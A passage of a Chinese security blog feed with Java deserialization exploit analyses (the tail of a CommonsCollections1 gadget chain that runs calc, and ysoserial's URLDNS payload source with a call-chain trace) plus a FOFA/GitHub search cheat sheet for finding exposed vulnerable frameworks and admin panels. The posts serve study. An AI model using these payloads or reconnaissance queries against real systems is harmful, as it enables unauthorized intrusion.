class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line">        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功弹出计算器</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections1%E5%88%86%E6%9E%90.assets/image-20240115150221455.png" alt="image-20240115150221455"></p><p>因为LazyMap实现的这条链，没有用到put方法，所以构造函数时也不需要Retention来满足条件</p>]]></content>
    
    
    <summary type="html">Java利用链CommonCollections1分析</summary>
    
    
    
    <category term="代码审计" scheme="http://example.com/category/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="Java代码审计" scheme="http://example.com/tag/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Java利用链URLDNS分析</title>
    <link href="http://example.com/posts/2714285355.html"/>
    <id>http://example.com/posts/2714285355.html</id>
    <published>2024-01-04T01:56:42.000Z</published>
    <updated>2024-03-03T14:42:54.570Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java利用链URLDNS分析"><a href="#Java利用链URLDNS分析" class="headerlink" title="Java利用链URLDNS分析"></a>Java利用链URLDNS分析</h1><p>Refer ：<a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p><p>查看ysoserial工具的URLDNS利用链代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A blog post with more details about this gadget chain is at the url below:</span></span><br><span class="line"><span class="comment"> *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   This was inspired by  Philippe Arteau <span class="doctag">@h</span>3xstream, who wrote a blog</span></span><br><span class="line"><span class="comment"> *   posting describing how he modified the Java Commons Collections gadget</span></span><br><span class="line"><span class="comment"> *   in ysoserial to open a URL. This takes the same idea, but eliminates</span></span><br><span class="line"><span class="comment"> *   the dependency on Commons Collections and does a DNS lookup with just</span></span><br><span class="line"><span class="comment"> *   standard JDK classes.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The Java URL class has an interesting property on its equals and</span></span><br><span class="line"><span class="comment"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span></span><br><span class="line"><span class="comment"> *   during a comparison (either equals or hashCode).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   As part of deserialization, HashMap calls hashCode on each key that it</span></span><br><span class="line"><span class="comment"> *   deserializes, so using a Java URL object as a serialized key allows</span></span><br><span class="line"><span class="comment"> *   it to trigger a DNS lookup.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   Gadget Chain:</span></span><br><span class="line"><span class="comment"> *     HashMap.readObject()</span></span><br><span class="line"><span class="comment"> *       HashMap.putVal()</span></span><br><span class="line"><span class="comment"> *         HashMap.hash()</span></span><br><span class="line"><span class="comment"> *           URL.hashCode()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest(skip = &quot;true&quot;)</span></span><br><span class="line"><span class="meta">@Dependencies()</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.GEBL &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>关注HashMap的ReadObject反序列化方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                         mappings);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">        <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">        <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">        <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">        <span class="type">float</span> <span class="variable">fc</span> <span class="operator">=</span> (<span class="type">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                   DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                   (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                   MAXIMUM_CAPACITY :</span><br><span class="line">                   tableSizeFor((<span class="type">int</span>)fc));</span><br><span class="line">        <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                     (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据代码中的注释<code>During the put above, the URL&#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</code>说明hashcode计算触发了DNS请求，所以关注hashcode相关方法</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BEURLDNS%E5%88%86%E6%9E%90.assets/image-20240104100747824.png" alt="image-20240104100747824"></p><p>其中hash()方法为，调用了key的hashcode方法</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BEURLDNS%E5%88%86%E6%9E%90.assets/image-20240104101233562.png" alt="image-20240104101233562"></p><p>在ysoserial中key是URL查看URL的hashcode方法</p><p>当hashcode为-1时执行handler的hashcode方法</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BEURLDNS%E5%88%86%E6%9E%90.assets/image-20240104101442982.png" alt="image-20240104101442982"></p><p>在ysoserial中的handler是URLStreamHandler，继续查看URLStreamHandler的hashcode方法，其中有getHostAddress()方法跟进一下</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BEURLDNS%E5%88%86%E6%9E%90.assets/image-20240104101822275.png" alt="image-20240104101822275"></p><p>这个InetAddress.getByName()方法根据主机名获取IP，进行了一次DNS查询</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BEURLDNS%E5%88%86%E6%9E%90.assets/image-20240104101954406.png" alt="image-20240104101954406"></p><p>因此整体利用链如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HashMap=&gt;ReadObject()=&gt;hash()</span><br><span class="line">=&gt;URL=&gt;hashcode()</span><br><span class="line">=&gt;URLStreamHandler=&gt;hashcode()=&gt;getHostAddress()=&gt;InetAddress.getByName()</span><br></pre></td></tr></table></figure><p>复现一下整个利用链，调整DEBUG参数</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BEURLDNS%E5%88%86%E6%9E%90.assets/image-20240104102656998.png" alt="image-20240104102656998"></p><p>执行URLDNS DEBUG</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BEURLDNS%E5%88%86%E6%9E%90.assets/image-20240104102822397.png" alt="image-20240104102822397"></p><p>查看dnslog的回显</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BEURLDNS%E5%88%86%E6%9E%90.assets/image-20240104102842914.png" alt="image-20240104102842914"></p>]]></content>
    
    
    <summary type="html">Java利用链URLDNS分析</summary>
    
    
    
    <category term="代码审计" scheme="http://example.com/category/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="Java代码审计" scheme="http://example.com/tag/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>FOFA&amp;GitHub的常用搜索备忘录</title>
    <link href="http://example.com/posts/3065416875.html"/>
    <id>http://example.com/posts/3065416875.html</id>
    <published>2023-12-28T11:16:48.000Z</published>
    <updated>2024-03-03T14:43:30.994Z</updated>
    
    <content type="html"><![CDATA[<h1 id="FOFA搜索技巧"><a href="#FOFA搜索技巧" class="headerlink" title="FOFA搜索技巧"></a>FOFA搜索技巧</h1><h2 id="body"><a href="#body" class="headerlink" title="body"></a>body</h2><p>搜索html正文中含有”管理后台”关键词的网站和IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">body=&quot;OA系统&quot;</span><br></pre></td></tr></table></figure><h2 id="after"><a href="#after" class="headerlink" title="after"></a>after</h2><p>在2023年12月28日后的发现网站(用于发现新网站)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">after=&quot;2023-12-28&quot;</span><br></pre></td></tr></table></figure><h2 id="country"><a href="#country" class="headerlink" title="country"></a>country</h2><p>搜索目标的资产，(不)包含某个国家</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">country!=&quot;CN&quot; </span><br></pre></td></tr></table></figure><h2 id="domain"><a href="#domain" class="headerlink" title="domain"></a>domain</h2><p>搜索根域名中带有”scut.edu.cn”的网站</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">domain=&quot;scut.edu.cn&quot;</span><br></pre></td></tr></table></figure><h2 id="host"><a href="#host" class="headerlink" title="host"></a>host</h2><p>搜索域名中带有”krkr”关键词的网站</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host=&quot;krkr&quot;</span><br></pre></td></tr></table></figure><h2 id="ip"><a href="#ip" class="headerlink" title="ip"></a>ip</h2><p>搜索指定ip或者ip段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip=&quot;121.4.165.70&quot;</span><br><span class="line">ip=&quot;121.4.165.1/24&quot;</span><br></pre></td></tr></table></figure><h2 id="WEB框架搜索"><a href="#WEB框架搜索" class="headerlink" title="WEB框架搜索"></a>WEB框架搜索</h2><h3 id="ThinkPHP框架"><a href="#ThinkPHP框架" class="headerlink" title="ThinkPHP框架"></a>ThinkPHP框架</h3><blockquote><p><strong>引用: <a href="https://www.cnblogs.com/sunny11/p/14388508.html">https://www.cnblogs.com/sunny11/p/14388508.html</a></strong> </p></blockquote><p>搜索WEB框架为ThinkPHP并且地区不为CN的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header=&quot;thinkphp&quot; &amp;&amp; country!=&quot;CN&quot;</span><br></pre></td></tr></table></figure><p>搜索WEB框架为ThinkPHP并且地区不为CN且包含后台管理的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header=&quot;thinkphp&quot; &amp;&amp; country!=&quot;CN&quot; &amp;&amp; title=&quot;后台管理&quot;</span><br></pre></td></tr></table></figure><p>搜索WEB框架为ThinkPHP并且地区不为CN且包含后台管理的，在某个时间段发现的</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">header</span>=&quot;thinkphp&quot; &amp;&amp; country!=&quot;CN&quot; &amp;&amp; title=&quot;后台管理&quot; &amp;&amp; after=&quot;<span class="number">2023</span>-<span class="number">06</span>-<span class="number">01</span>&quot;</span><br></pre></td></tr></table></figure><h3 id="Shiro框架"><a href="#Shiro框架" class="headerlink" title="Shiro框架"></a>Shiro框架</h3><p>FOFA搜索规则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app=&quot;Apache-Shiro&quot; || header=&quot;rememberme=deleteMe&quot; || header=&quot;shiroCookie&quot;</span><br></pre></td></tr></table></figure><h3 id="Struts2框架"><a href="#Struts2框架" class="headerlink" title="Struts2框架"></a>Struts2框架</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app=&quot;Struts2&quot;</span><br></pre></td></tr></table></figure><h3 id="Spring框架"><a href="#Spring框架" class="headerlink" title="Spring框架"></a>Spring框架</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icon_hash=&quot;116323821&quot; || body=&quot;Whitelabel Error Page&quot;</span><br></pre></td></tr></table></figure><h3 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app=&quot;BEA-WebLogic-Server&quot; ||  app=&quot;Weblogic_interface_7001&quot;</span><br></pre></td></tr></table></figure><h2 id="WEB应用搜索"><a href="#WEB应用搜索" class="headerlink" title="WEB应用搜索"></a>WEB应用搜索</h2><h3 id="若依"><a href="#若依" class="headerlink" title="若依"></a>若依</h3><p>FOFA规则：通过标题或者icon进行搜索</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">title=&quot;若依&quot;</span><br><span class="line">icon_hash=&quot;706913071&quot;</span><br><span class="line">icon_hash=&quot;706913071&quot; || title=&quot;若依&quot;</span><br></pre></td></tr></table></figure><h3 id="Nacos"><a href="#Nacos" class="headerlink" title="Nacos"></a>Nacos</h3><p>FOFA规则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app=&quot;nacos&quot;</span><br></pre></td></tr></table></figure><h3 id="通达OA"><a href="#通达OA" class="headerlink" title="通达OA"></a>通达OA</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app=&quot;TongDa-OA&quot;</span><br></pre></td></tr></table></figure><h3 id="Openfire"><a href="#Openfire" class="headerlink" title="Openfire"></a>Openfire</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icon_hash=&quot;1211608009&quot; &amp;&amp; port=&quot;9090&quot;</span><br></pre></td></tr></table></figure><h3 id="PbootCMS"><a href="#PbootCMS" class="headerlink" title="PbootCMS"></a>PbootCMS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">banner=&quot;Set-Cookie: pbootsystem=&quot; || header=&quot;Set-Cookie: pbootsystem=&quot; || title=&quot;PbootCMS&quot;</span><br></pre></td></tr></table></figure><h3 id="nginxWebUI"><a href="#nginxWebUI" class="headerlink" title="nginxWebUI"></a>nginxWebUI</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app=&quot;nginxWebUI&quot;</span><br></pre></td></tr></table></figure><h2 id="关键类型站点搜索"><a href="#关键类型站点搜索" class="headerlink" title="关键类型站点搜索"></a>关键类型站点搜索</h2><h3 id="棋牌类"><a href="#棋牌类" class="headerlink" title="棋牌类"></a>棋牌类</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=&quot;后台&quot; &amp;&amp; body=&quot;棋牌&quot;</span><br></pre></td></tr></table></figure><h2 id="FOFA搜证书序列号"><a href="#FOFA搜证书序列号" class="headerlink" title="FOFA搜证书序列号"></a>FOFA搜证书序列号</h2><p><strong>（1）更多信息</strong></p><p><img src="/image/article/FOFA%E7%9A%84%E5%B8%B8%E7%94%A8%E6%90%9C%E7%B4%A2%E5%A4%87%E5%BF%98%E5%BD%95.assets/image-20230611175931388.png" alt="image-20230611175931388"></p><p><strong>（2）查看证书</strong></p><p><img src="/image/article/FOFA%E7%9A%84%E5%B8%B8%E7%94%A8%E6%90%9C%E7%B4%A2%E5%A4%87%E5%BF%98%E5%BD%95.assets/image-20230611180110256.png" alt="image-20230611180110256"></p><p><strong>（3）证书序列号</strong></p><p><img src="/image/article/FOFA%E7%9A%84%E5%B8%B8%E7%94%A8%E6%90%9C%E7%B4%A2%E5%A4%87%E5%BF%98%E5%BD%95.assets/image-20230611180253034.png" alt="image-20230611180253034"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">584BB45B43A5552A7FCD8F30</span><br></pre></td></tr></table></figure><p><strong>(4)16进制转10进制</strong></p><p><a href="https://tool.lu/hexconvert">https://tool.lu/hexconvert</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">27326202010244486292310953776</span><br></pre></td></tr></table></figure><p><img src="/image/article/FOFA%E7%9A%84%E5%B8%B8%E7%94%A8%E6%90%9C%E7%B4%A2%E5%A4%87%E5%BF%98%E5%BD%95.assets/image-20230611180609142.png" alt="image-20230611180609142"></p><p><strong>（5）FOFA搜</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cert=27326202010244486292310953776</span><br></pre></td></tr></table></figure><p><img src="/image/article/FOFA%E7%9A%84%E5%B8%B8%E7%94%A8%E6%90%9C%E7%B4%A2%E5%A4%87%E5%BF%98%E5%BD%95.assets/image-20230611180704109.png" alt="image-20230611180704109"></p><h1 id="Github搜索技巧"><a href="#Github搜索技巧" class="headerlink" title="Github搜索技巧"></a>Github搜索技巧</h1><p>kali in:file 搜索文件中包含kali的代码 </p><p>kali in:path 搜索路径中包含kali的代码</p><p>kali in:path,file 搜索路径、文件中包含kali的代码 </p><p>shodan language:python 搜索关键字shodan，语言为python的代码 </p><p>filename:config.php language:php 搜索文件名为config.php，且语言为php </p><p>kali topics:&gt;&#x3D;5 标签数量大于等于5的 </p><p>kali size:&lt;1000 文件小于1KB的</p><p>kali stars:10..50 star大于10小于50的 </p><p>kali pushed:&gt;2021-08-15 搜索在2021年8月15日之后提交的 </p><p>kali pushed:2021-07-01..2021-08-01 搜索在此区间 </p><p>kali created:&gt;&#x3D;2021-06-01 创建时间 </p><p>kali pushed:&lt;2021-08-01 -language:java 搜索在2020年8月1日前push代码且排除java语言 </p>]]></content>
    
    
    <summary type="html">FOFA的常用搜索备忘录</summary>
    
    
    
